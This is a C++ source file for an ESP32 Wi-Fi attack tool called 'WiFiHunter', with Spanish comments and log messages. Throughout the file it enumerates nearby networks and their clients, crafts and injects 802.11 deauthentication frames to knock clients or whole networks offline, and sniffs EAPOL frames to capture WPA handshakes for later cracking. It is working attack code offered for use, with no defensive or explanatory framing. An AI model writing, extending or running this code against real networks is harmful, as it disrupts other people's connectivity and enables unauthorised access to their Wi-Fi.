#include "WiFiHunter.h"
#include "esp_wifi.h"  // Añadir este include para las funciones de WiFi

WiFiHunter* WiFiHunter::instance = nullptr;
HandshakeCallback WiFiHunter::handshakeCB = nullptr;

void WiFiHunter::begin() {
    instance = this;
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    Serial.println("Modo promiscuo activado");
}

void WiFiHunter::startScan() {
    esp_wifi_set_promiscuous(false);
    WiFi.scanNetworks(true, false);
}

bool WiFiHunter::isScanDone() {
    return (WiFi.scanComplete() >= 0);
}

void WiFiHunter::getScanResults(RedInfo* resultados, int maxRedes, int& encontradas) {
    int n = WiFi.scanComplete();
    if (n <= 0) { encontradas = 0; return; }
    
    encontradas = (n < maxRedes) ? n : maxRedes;
    for (int i = 0; i < encontradas; i++) {
        strncpy(resultados[i].ssid, WiFi.SSID(i).c_str(), 32);
        resultados[i].ssid[32] = '\0';
        memcpy(resultados[i].bssid, WiFi.BSSID(i), 6);
        resultados[i].rssi = WiFi.RSSI(i);
        resultados[i].canal = WiFi.channel(i);
        resultados[i].tieneClave = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        resultados[i].handshakeCapturado = false;
    }
    WiFi.scanDelete();
    esp_wifi_set_promiscuous(true);
    Serial.printf("%d redes encontradas\n", encontradas);
}

void WiFiHunter::scanClients(const uint8_t* bssid, int canal) {
    memcpy(bssidObjetivo, bssid, 6);
    canalObjetivo = canal;
    numClientes = 0;
    escaneandoClientes = true;
    
    esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
    Serial.printf("Escaneando clientes en canal %d\n", canal);
    
    unsigned long start = millis();
    while (millis() - start < 3000) {
        delay(10);
        processPendingHandshakes();
    }
    
    unsigned long ahora = millis();
    for (int i = 0; i < numClientes; i++) {
        if (ahora - clientes[i].ultimaVez > CLIENTE_TIMEOUT) {
            for (int j = i; j < numClientes - 1; j++) {
                memcpy(&clientes[j], &clientes[j+1], sizeof(ClienteInfo));
            }
            numClientes--;
            i--;
        }
    }
    
    escaneandoClientes = false;
    Serial.printf("Clientes encontrados: %d\n", numClientes);
}

ClienteInfo* WiFiHunter::getClientes(int& count) {
    count = numClientes;
    return clientes;
}

void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPaquetes) {
    Serial.printf("Atacando red: %s (canal %d)\n", red.ssid, red.canal);
    
    esp_wifi_set_channel(red.canal, WIFI_SECOND_CHAN_NONE);
    delay(50);
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    const uint8_t* target = clienteMac ? clienteMac : broadcast;
    
    for (int i = 0; i < numPaquetes; i++) {
        sendDeauthFrame(red.bssid, target, red.canal);
        delay(5);
    }
    
    if (clienteMac) {
        for (int i = 0; i < 5; i++) {
            sendDeauthFrame(red.bssid, broadcast, red.canal);
            delay(10);
        }
    }
    
    Serial.printf("%d paquetes de deauth enviados\n", numPaquetes + (clienteMac ? 5 : 0));
}

void WiFiHunter::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clienteMac, int channel) {
    uint8_t deauthFrame[26];
    
    deauthFrame[0] = 0xC0;
    deauthFrame[1] = 0x00;
    deauthFrame[2] = 0x3A;
    deauthFrame[3] = 0x01;
    
    memcpy(&deauthFrame[4], clienteMac, 6);
    
    uint8_t nuestraMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
    memcpy(&deauthFrame[10], nuestraMac, 6);
    memcpy(&deauthFrame[16], bssid, 6);
    
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;
    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
    if (err != ESP_OK) {
        Serial.printf("Error enviando deauth: %d\n", err);
    }
}

void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int rssi = pkt->rx_ctrl.rssi;
    
    if (len < 24) return;
    
    uint8_t* addr1 = &frame[4];
    uint8_t* addr2 = &frame[10];
    uint8_t* addr3 = &frame[16];
    
    if (len > 100) {
        int offset = 24;
        for (int i = offset; i < len - 8; i++) {
            if (frame[i] == 0xAA && frame[i+1] == 0xAA && frame[i+2] == 0x03 &&
                frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
                if (frame[i+9] == 0x03) {
                    if (instance) {
                        int next = (instance->head + 1) % MAX_PENDING_HS;
                        if (next != instance->tail) {
                            uint32_t copyLen = (len < 256) ? len : 256;
                            memcpy(instance->pending[instance->head].frame, frame, copyLen);
                            instance->pending[instance->head].len = copyLen;
                            instance->head = next;
                        }
                    }
                    break;
                }
            }
        }
    }
    
    if (!instance || !instance->escaneandoClientes) return;
    
    uint8_t* bssid = addr3;
    if (memcmp(bssid, instance->bssidObjetivo, 6) != 0) {
        if (memcmp(addr1, instance->bssidObjetivo, 6) != 0 &&
            memcmp(addr2, instance->bssidObjetivo, 6) != 0) {
            return;
        }
    }
    
    uint8_t* macCliente = nullptr;
    if (memcmp(addr1, instance->bssidObjetivo, 6) != 0) {
        macCliente = addr1;
    } else if (memcmp(addr2, instance->bssidObjetivo, 6) != 0) {
        macCliente = addr2;
    } else {
        return;
    }
    
    instance->actualizarCliente(macCliente, rssi, instance->bssidObjetivo, instance->canalObjetivo);
}

void WiFiHunter::actualizarCliente(uint8_t* mac, int rssi, uint8_t* bssid, int canal) {
    unsigned long ahora = millis();
    
    for (int i = 0; i < numClientes; i++) {
        if (memcmp(clientes[i].mac, mac, 6) == 0) {
            clientes[i].rssi = rssi;
            clientes[i].ultimaVez = ahora;
            return;
        }
    }
    
    if (numClientes < MAX_CLIENTES) {
        memcpy(clientes[numClientes].mac, mac, 6);
        clientes[numClientes].rssi = rssi;
        clientes[numClientes].canal = canal;
        memcpy(clientes[numClientes].bssid, bssid, 6);
        clientes[numClientes].ultimaVez = ahora;
        const char* fab = buscarOUI(mac);
        strncpy(clientes[numClientes].fabricante, fab, 15);
        clientes[numClientes].fabricante[15] = '\0';
        numClientes++;
    }
}

void WiFiHunter::processPendingHandshakes() {
    while (tail != head) {
        if (handshakeCB) {
            handshakeCB(pending[tail].frame, pending[tail].len);
        }
        tail = (tail + 1) % MAX_PENDING_HS;
    }
}

void WiFiHunter::setHandshakeCallback(HandshakeCallback cb) {
    handshakeCB = cb;
}
